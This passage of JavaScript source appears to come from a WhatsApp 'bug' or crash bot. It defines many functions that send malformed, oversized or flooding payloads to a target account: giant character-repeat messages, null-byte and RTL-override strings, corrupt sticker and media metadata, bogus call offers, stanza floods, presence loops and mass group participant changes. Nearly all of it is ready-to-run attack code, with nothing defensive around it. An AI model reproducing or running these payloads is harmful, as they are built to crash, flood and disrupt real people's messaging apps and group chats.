              { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(2000), url: 'https://x.com/' + i }) },
              { name: 'cta_copy', buttonParamsJson: JSON.stringify({ copy_code: 'ꦾ'.repeat(2000) }) }
            ]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CAROUSEL 10: Combined ─────────────────────────────────────
async function bug_carousel10(sock, target) {
  await bug_carousel1(sock, target);
  await sleep(500);
  await bug_carousel4(sock, target);
}

// ─── STICKER 1: Animated Overflow ──────────────────────────────
async function bug_sticker1(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/stk.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp',
        height: 9999,
        width: 9999,
        directPath: '/stk.enc',
        fileLength: 999999999,
        isAnimated: true,
        firstFrameLength: 19904,
        firstFrameSidecar: 'KN4kQ5pyABRAgA=='
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── STICKER 2: Lottie Corrupt ─────────────────────────────────
async function bug_sticker2(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/lottie.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'application/was',
        height: 512, width: 512,
        directPath: '/lottie.enc',
        fileLength: 999999999,
        isLottie: true
      }
    }, {}).catch(() => {});
    await sleep(150);
  }
}

// ─── STICKER 3: AI Sticker ─────────────────────────────────────
async function bug_sticker3(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/ai.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp',
        height: 9999, width: 9999,
        directPath: '/ai.enc',
        fileLength: 999999999,
        isAiSticker: true
      }
    }, {}).catch(() => {});
    await sleep(150);
  }
}

// ─── STICKER 4: Avatar Sticker ─────────────────────────────────
async function bug_sticker4(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/av.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp',
        height: 512, width: 512,
        directPath: '/av.enc',
        fileLength: 999999999,
        isAvatar: true
      }
    }, {}).catch(() => {});
    await sleep(150);
  }
}

// ─── STICKER 5: Mention Mass Sticker ───────────────────────────
async function bug_sticker5(sock, target) {
  const msg = genWAMessage(target, {
    stickerMessage: {
      url: 'https://mmg.whatsapp.net/mention.enc',
      fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
      fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
      mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
      mimetype: 'image/webp',
      height: 512, width: 512,
      directPath: '/mention.enc',
      fileLength: 999999999,
      contextInfo: {
        mentionedJid: Array.from({ length: 20000 }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
        )
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── STICKER 6: Pack Flood ─────────────────────────────────────
async function bug_sticker6(sock, target) {
  for (let i = 0; i < 5; i++) {
    await sock.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: 'sp_' + Date.now() + '_' + i,
        name: 'ꦾ'.repeat(50000),
        publisher: 'ꦾ'.repeat(50000),
        stickers: [],
        fileLength: '999999999',
        fileSha256: 'G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=',
        fileEncSha256: '2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=',
        mediaKey: 'rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=',
        directPath: '/sp.enc',
        mediaKeyTimestamp: Date.now().toString()
      }
    }, {}).catch(() => {});
    await sleep(300);
  }
}

// ─── STICKER 7: Invalid Hash ───────────────────────────────────
async function bug_sticker7(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/inv.enc',
        fileSha256: '\u0000'.repeat(50),
        fileEncSha256: '\u0000'.repeat(50),
        mediaKey: '\u0000'.repeat(50),
        mimetype: 'image/webp',
        height: 512, width: 512,
        directPath: '/inv.enc',
        fileLength: 999999999
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── STICKER 8: Zero Dimension ─────────────────────────────────
async function bug_sticker8(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/zero.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp',
        height: 0, width: 0,
        directPath: '/zero.enc',
        fileLength: 0
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── STICKER 9: Massive Sidecar ────────────────────────────────
async function bug_sticker9(sock, target) {
  await sock.relayMessage(target, {
    stickerMessage: {
      url: 'https://mmg.whatsapp.net/sc.enc',
      fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
      fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
      mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
      mimetype: 'image/webp',
      height: 512, width: 512,
      directPath: '/sc.enc',
      fileLength: 999999999,
      firstFrameSidecar: Buffer.alloc(500000, 0xFF)
    }
  }, {}).catch(() => {});
}

// ─── STICKER 10: Combined ──────────────────────────────────────
async function bug_sticker10(sock, target) {
  await bug_sticker1(sock, target);
  await sleep(500);
  await bug_sticker6(sock, target);
}

// ─── CALL 1: Rate Zero ─────────────────────────────────────────
async function bug_call1(sock, target) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '0' } },
        { tag: 'net', attrs: { medium: '0' } }
      ]
    }]
  }).catch(() => {});
}

// ─── CALL 2: Multiple Audio ────────────────────────────────────
async function bug_call2(sock, target) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: Array.from({ length: 100 }, () => ({ tag: 'audio', attrs: { enc: 'opus', rate: '8000' } }))
    }]
  }).catch(() => {});
}

// ─── CALL 3: Massive Capability ────────────────────────────────
async function bug_call3(sock, target) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
        { tag: 'capability', attrs: { ver: '99' }, content: Buffer.alloc(100000, 0xFF) }
      ]
    }]
  }).catch(() => {});
}

// ─── CALL 4: Nested Video ──────────────────────────────────────
async function bug_call4(sock, target) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
        ...Array.from({ length: 50 }, () => ({
          tag: 'video',
          attrs: { enc: 'vp8', dec: 'vp8', orientation: '0', screen_width: '1920', screen_height: '1080', device_orientation: '0' }
        })),
        { tag: 'net', attrs: { medium: '3' } }
      ]
    }]
  }).catch(() => {});
}

// ─── CALL 5: Encopt Invalid ────────────────────────────────────
async function bug_call5(sock, target) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
        { tag: 'encopt', attrs: { keygen: '99999' } },
        { tag: 'net', attrs: { medium: '3' } }
      ]
    }]
  }).catch(() => {});
}

// ─── CALL 6: Destination Bomb ──────────────────────────────────
async function bug_call6(sock, target) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
        { tag: 'destination', attrs: {}, content: Array.from({ length: 5000 }, () => ({
          tag: 'to', attrs: { jid: Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net' }
        })) }
      ]
    }]
  }).catch(() => {});
}

// ─── CALL 7: Missing Net ───────────────────────────────────────
async function bug_call7(sock, target) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } }
      ]
    }]
  }).catch(() => {});
}

// ─── CALL 8: Repeated Offer ────────────────────────────────────
async function bug_call8(sock, target) {
  for (let i = 0; i < 10; i++) {
    const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
    await sock.query({
      tag: 'call',
      attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
      content: [{
        tag: 'offer',
        attrs: { 'call-id': callId, 'call-creator': sock.user.id },
        content: [
          { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
          { tag: 'net', attrs: { medium: '3' } }
        ]
      }]
    }).catch(() => {});
    await sleep(300);
  }
}

// ─── CALL 9: Call Terminate ────────────────────────────────────
async function bug_call9(sock, target) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'terminate',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id, reason: 'timeout' },
      content: []
    }]
  }).catch(() => {});
}

// ─── CALL 10: Combined ─────────────────────────────────────────
async function bug_call10(sock, target) {
  await bug_call1(sock, target);
  await sleep(500);
  await bug_call3(sock, target);
}

// ─── PAYLOAD 1: Oversized Conversation ─────────────────────────
async function bug_payload1(sock, target) {
  await sock.relayMessage(target, {
    conversation: 'ꦾ'.repeat(500000)
  }, {}).catch(() => {});
}

// ─── PAYLOAD 2: Oversized Extended ─────────────────────────────
async function bug_payload2(sock, target) {
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(500000),
      matchedText: 'ꦾ'.repeat(500000),
      description: 'ꦾ'.repeat(500000),
      title: 'ꦾ'.repeat(500000)
    }
  }, {}).catch(() => {});
}

// ─── PAYLOAD 3: Null Bytes Massive ─────────────────────────────
async function bug_payload3(sock, target) {
  await sock.relayMessage(target, {
    conversation: '\u0000'.repeat(1000000)
  }, {}).catch(() => {});
}

// ─── PAYLOAD 4: Mention 50K ────────────────────────────────────
async function bug_payload4(sock, target) {
  const msg = genWAMessage(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(30000),
      contextInfo: {
        mentionedJid: Array.from({ length: 50000 }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
        )
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── PAYLOAD 5: Base64 Bomb ────────────────────────────────────
async function bug_payload5(sock, target) {
  const b64 = crypto.randomBytes(500000).toString('base64');
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: b64,
      matchedText: b64.slice(0, 50000),
      description: b64,
      title: b64
    }
  }, {}).catch(() => {});
}

// ─── PAYLOAD 6: Emoji Repeat ───────────────────────────────────
async function bug_payload6(sock, target) {
  await sock.relayMessage(target, {
    conversation: '☠️'.repeat(200000)
  }, {}).catch(() => {});
}

// ─── PAYLOAD 7: RTL Override ───────────────────────────────────
async function bug_payload7(sock, target) {
  await sock.relayMessage(target, {
    conversation: '\u202E'.repeat(300000)
  }, {}).catch(() => {});
}

// ─── PAYLOAD 8: Surrogate Broken ───────────────────────────────
async function bug_payload8(sock, target) {
  await sock.relayMessage(target, {
    conversation: '\uD800'.repeat(300000)
  }, {}).catch(() => {});
}

// ─── PAYLOAD 9: ZWJ Chain ──────────────────────────────────────
async function bug_payload9(sock, target) {
  await sock.relayMessage(target, {
    conversation: '👨‍👩‍👧‍👦'.repeat(100000)
  }, {}).catch(() => {});
}

// ─── PAYLOAD 10: Combined ──────────────────────────────────────
async function bug_payload10(sock, target) {
  await bug_payload3(sock, target);
  await sleep(500);
  await bug_payload4(sock, target);
}

// ══════════════════════════════════════════════════════════════
// 100 BUG BATCH 2 — STANZA / MEDIA / PRESENCE / GROUP / CRYPTO
// BUSINESS / NEWSLETTER / DEVICE / PRIVACY / CHAIN
// ══════════════════════════════════════════════════════════════

// ─── STANZA 1: Query Raw Invalid ───────────────────────────────
async function bug_stanza1(sock, target) {
  await sock.query({
    tag: 'iq',
    attrs: { to: target, type: 'get', id: sock.generateMessageTag(), xmlns: 'invalid' },
    content: [{ tag: 'query', attrs: {}, content: Buffer.alloc(100000, 0xFF) }]
  }).catch(() => {});
}

// ─── STANZA 2: Presence Subscribe ──────────────────────────────
async function bug_stanza2(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.query({
      tag: 'presence',
      attrs: { to: target, type: 'subscribe' }
    }).catch(() => {});
    await sleep(50);
  }
}

// ─── STANZA 3: Message Receipt Invalid ─────────────────────────
async function bug_stanza3(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.query({
      tag: 'receipt',
      attrs: {
        to: target,
        id: '3EB0' + '\u0000'.repeat(500),
        type: 'invalid_type',
        t: '99999999999999'
      }
    }).catch(() => {});
    await sleep(50);
  }
}

// ─── STANZA 4: Chatstate Bomb ──────────────────────────────────
async function bug_stanza4(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.query({
      tag: 'chatstate',
      attrs: { to: target },
      content: [{ tag: 'composing', attrs: {} }]
    }).catch(() => {});
    await sleep(30);
  }
}

// ─── STANZA 5: Ack Invalid ─────────────────────────────────────
async function bug_stanza5(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.query({
      tag: 'ack',
      attrs: {
        to: target,
        id: '3EB0' + '\u0000'.repeat(800),
        class: 'invalid'
      }
    }).catch(() => {});
    await sleep(30);
  }
}

// ─── STANZA 6: IQ Blocklist Flood ──────────────────────────────
async function bug_stanza6(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'set', id: sock.generateMessageTag(), xmlns: 'blocklist' },
      content: [{
        tag: 'item',
        attrs: { action: 'block', jid: target }
      }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── STANZA 7: IQ Picture Query ────────────────────────────────
async function bug_stanza7(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'get', id: sock.generateMessageTag(), xmlns: 'w:profile:picture' },
      content: [{ tag: 'picture', attrs: { type: 'image', query: 'url' }, content: target }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── STANZA 8: IQ Status Query ─────────────────────────────────
async function bug_stanza8(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'get', id: sock.generateMessageTag(), xmlns: 'status' },
      content: [{ tag: 'status', attrs: {}, content: target }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── STANZA 9: IQ Privacy Query ────────────────────────────────
async function bug_stanza9(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'get', id: sock.generateMessageTag(), xmlns: 'privacy' },
      content: [{ tag: 'privacy', attrs: {}, content: Buffer.alloc(50000, 0xFF) }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── STANZA 10: Combined ───────────────────────────────────────
async function bug_stanza10(sock, target) {
  await bug_stanza2(sock, target);
  await sleep(300);
  await bug_stanza4(sock, target);
  await sleep(300);
  await bug_stanza5(sock, target);
}

// ─── MEDIA 1: Upload Invalid ───────────────────────────────────
async function bug_media1(sock, target) {
  await sock.relayMessage(target, {
    imageMessage: {
      url: 'https://mmg.whatsapp.net/invalid_upload.enc',
      mimetype: 'image/jpeg',
      fileSha256: Buffer.alloc(32, 0xFF).toString('base64'),
      fileLength: '99999999999999',
      height: 99999, width: 99999,
      mediaKey: Buffer.alloc(32, 0xEE).toString('base64'),
      fileEncSha256: Buffer.alloc(32, 0xDD).toString('base64'),
      directPath: '/invalid_upload.enc',
      mediaKeyTimestamp: '99999999999999'
    }
  }, {}).catch(() => {});
}

// ─── MEDIA 2: Download Null ────────────────────────────────────
async function bug_media2(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      imageMessage: {
        url: 'https://mmg.whatsapp.net/null_download.enc',
        mimetype: 'image/jpeg',
        fileSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
        fileLength: '0',
        height: 0, width: 0,
        mediaKey: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
        fileEncSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
        directPath: '/null_download.enc'
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── MEDIA 3: MediaKey Mismatch ────────────────────────────────
async function bug_media3(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      videoMessage: {
        url: 'https://mmg.whatsapp.net/mismatch.enc',
        mimetype: 'video/mp4',
        fileSha256: crypto.randomBytes(32).toString('base64'),
        fileLength: '9999999',
        seconds: 999999,
        height: 9999, width: 9999,
        mediaKey: crypto.randomBytes(32).toString('base64'),
        fileEncSha256: crypto.randomBytes(32).toString('base64'),
        directPath: '/mismatch.enc'
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── MEDIA 4: Oversized Thumbnail ──────────────────────────────
async function bug_media4(sock, target) {
  await sock.relayMessage(target, {
    imageMessage: {
      url: 'https://mmg.whatsapp.net/thumb.enc',
      mimetype: 'image/jpeg',
      fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
      fileLength: '9999999',
      height: 1080, width: 1080,
      mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
      fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
      directPath: '/thumb.enc',
      jpegThumbnail: Buffer.alloc(5000000, 0xFF)
    }
  }, {}).catch(() => {});
}

// ─── MEDIA 5: PTV Corrupt ──────────────────────────────────────
async function bug_media5(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      ptvMessage: {
        url: 'https://mmg.whatsapp.net/ptv_corrupt.enc',
        mimetype: 'video/mp4',
        fileSha256: crypto.randomBytes(32).toString('base64'),
        fileLength: '9999999999',
        seconds: 999999,
        mediaKey: crypto.randomBytes(32).toString('base64'),
        fileEncSha256: crypto.randomBytes(32).toString('base64'),
        directPath: '/ptv_corrupt.enc'
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── MEDIA 6: Audio Waveform Bomb ──────────────────────────────
async function bug_media6(sock, target) {
  await sock.relayMessage(target, {
    audioMessage: {
      url: 'https://mmg.whatsapp.net/audio_wave.enc',
      mimetype: 'audio/ogg; codecs=opus',
      fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
      fileLength: '9999999',
      seconds: 999999,
      ptt: true,
      mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
      fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
      directPath: '/audio_wave.enc',
      waveform: Buffer.alloc(1000000, 0xFF)
    }
  }, {}).catch(() => {});
}

// ─── MEDIA 7: Document Page Bomb ───────────────────────────────
async function bug_media7(sock, target) {
  await sock.relayMessage(target, {
    documentMessage: {
      url: 'https://mmg.whatsapp.net/doc_bomb.enc',
      mimetype: 'application/pdf',
      fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
      fileLength: '99999999999999',
      pageCount: 2147483647,
      mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
      fileName: 'ꦾ'.repeat(50000),
      fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
      directPath: '/doc_bomb.enc'
    }
  }, {}).catch(() => {});
}

// ─── MEDIA 8: Contact Array ────────────────────────────────────
async function bug_media8(sock, target) {
  const contacts = Array.from({ length: 500 }, (_, i) => ({
    displayName: 'ꦾ'.repeat(10000) + i,
    vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + 'ꦾ'.repeat(10000) + '\nTEL:+62' + i + '\nEND:VCARD'
  }));
  await sock.relayMessage(target, {
    contactsArrayMessage: {
      displayName: 'ꦾ'.repeat(50000),
      contacts
    }
  }, {}).catch(() => {});
}

// ─── MEDIA 9: Live Location Bomb ───────────────────────────────
async function bug_media9(sock, target) {
  await sock.relayMessage(target, {
    liveLocationMessage: {
      degreesLatitude: 999999,
      degreesLongitude: 999999,
      accuracyInMeters: 999999,
      speedInMps: 999999,
      degreesClockwiseFromMagneticNorth: 999999,
      caption: 'ꦾ'.repeat(100000),
      sequenceNumber: '99999999999',
      timeOffset: 999999999,
      contextInfo: {
        mentionedJid: Array.from({ length: 10000 }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
        )
      }
    }
  }, {}).catch(() => {});
}

// ─── MEDIA 10: Combined ────────────────────────────────────────
async function bug_media10(sock, target) {
  await bug_media1(sock, target);
  await sleep(300);
  await bug_media6(sock, target);
  await sleep(300);
  await bug_media8(sock, target);
}

// ─── PRESENCE 1: Composing Loop ────────────────────────────────
async function bug_presence1(sock, target) {
  for (let i = 0; i < 500; i++) {
    await sock.sendPresenceUpdate('composing', target).catch(() => {});
    await sleep(20);
  }
}

// ─── PRESENCE 2: Recording Loop ────────────────────────────────
async function bug_presence2(sock, target) {
  for (let i = 0; i < 500; i++) {
    await sock.sendPresenceUpdate('recording', target).catch(() => {});
    await sleep(20);
  }
}

// ─── PRESENCE 3: Paused Loop ───────────────────────────────────
async function bug_presence3(sock, target) {
  for (let i = 0; i < 500; i++) {
    await sock.sendPresenceUpdate('paused', target).catch(() => {});
    await sleep(20);
  }
}

// ─── PRESENCE 4: Available/Unavailable ─────────────────────────
async function bug_presence4(sock, target) {
  for (let i = 0; i < 200; i++) {
    await sock.sendPresenceUpdate('available').catch(() => {});
    await sleep(30);
    await sock.sendPresenceUpdate('unavailable').catch(() => {});
    await sleep(30);
  }
}

// ─── PRESENCE 5: Subscribe Loop ────────────────────────────────
async function bug_presence5(sock, target) {
  for (let i = 0; i < 200; i++) {
    await sock.presenceSubscribe(target).catch(() => {});
    await sleep(30);
  }
}

// ─── PRESENCE 6: Read Loop ─────────────────────────────────────
async function bug_presence6(sock, target) {
  for (let i = 0; i < 500; i++) {
    await sock.readMessages([{
      remoteJid: target,
      id: '3EB0' + crypto.randomBytes(8).toString('hex'),
      participant: target
    }]).catch(() => {});
    await sleep(20);
  }
}

// ─── PRESENCE 7: Typing + Quote ────────────────────────────────
async function bug_presence7(sock, target) {
  for (let i = 0; i < 200; i++) {
    await sock.sendPresenceUpdate('composing', target).catch(() => {});
    await sock.relayMessage(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(5000),
        contextInfo: {
          quotedMessage: { conversation: 'ꦾ'.repeat(5000) }
        }
      }
    }, {}).catch(() => {});
    await sleep(30);
  }
}

// ─── PRESENCE 8: Presence + Message ────────────────────────────
async function bug_presence8(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.sendPresenceUpdate('composing', target).catch(() => {});
    await sock.relayMessage(target, { conversation: 'ꦾ'.repeat(30000) }, {}).catch(() => {});
    await sleep(50);
  }
}

// ─── PRESENCE 9: Broadcast Presence ────────────────────────────
async function bug_presence9(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.sendPresenceUpdate('composing', 'status@broadcast').catch(() => {});
    await sock.sendPresenceUpdate('paused', 'status@broadcast').catch(() => {});
    await sleep(50);
  }
}

// ─── PRESENCE 10: Combined ─────────────────────────────────────
async function bug_presence10(sock, target) {
  await bug_presence1(sock, target);
  await sleep(300);
  await bug_presence6(sock, target);
}

// ─── GROUP 1: Participant Add Mass ─────────────────────────────
async function bug_group1(sock, target) {
  const jids = Array.from({ length: 5000 }, () =>
    Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
  );
  await sock.groupParticipantsUpdate(target, jids, 'add').catch(() => {});
}

// ─── GROUP 2: Participant Remove Mass ──────────────────────────
async function bug_group2(sock, target) {
  const jids = Array.from({ length: 5000 }, () =>
    Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
  );
  await sock.groupParticipantsUpdate(target, jids, 'remove').catch(() => {});
}

// ─── GROUP 3: Promote Mass ─────────────────────────────────────
async function bug_group3(sock, target) {
  const jids = Array.from({ length: 5000 }, () =>
    Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
  );
  await sock.groupParticipantsUpdate(target, jids, 'promote').catch(() => {});
}

// ─── GROUP 4: Demote Mass ──────────────────────────────────────
async function bug_group4(sock, target) {
  const jids = Array.from({ length: 5000 }, () =>
    Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
  );
  await sock.groupParticipantsUpdate(target, jids, 'demote').catch(() => {});
}

// ─── GROUP 5: Subject Change Loop ──────────────────────────────
async function bug_group5(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.groupUpdateSubject(target, 'ꦾ'.repeat(65535)).catch(() => {});
    await sleep(50);
  }
}

// ─── GROUP 6: Description Change Loop ──────────────────────────
async function bug_group6(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.groupUpdateDescription(target, 'ꦾ'.repeat(65535)).catch(() => {});
    await sleep(50);
  }
}

// ─── GROUP 7: Setting Change ───────────────────────────────────
async function bug_group7(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.groupSettingUpdate(target, 'announcement').catch(() => {});
    await sleep(30);
    await sock.groupSettingUpdate(target, 'not_announcement').catch(() => {});
    await sleep(30);
  }
}

// ─── GROUP 8: Metadata Fetch Loop ──────────────────────────────
async function bug_group8(sock, target) {
  for (let i = 0; i < 500; i++) {
    await sock.groupMetadata(target).catch(() => {});
    await sleep(20);
  }
}

// ─── GROUP 9: Invite Code Loop ─────────────────────────────────
async function bug_group9(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.groupInviteCode(target).catch(() => {});
    await sleep(30);
  }
}

// ─── GROUP 10: Combined ────────────────────────────────────────
async function bug_group10(sock, target) {
  await bug_group1(sock, target);
  await sleep(500);
  await bug_group5(sock, target);
}

// ─── CRYPTO 1: SenderKey Corrupt ───────────────────────────────
async function bug_crypto1(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
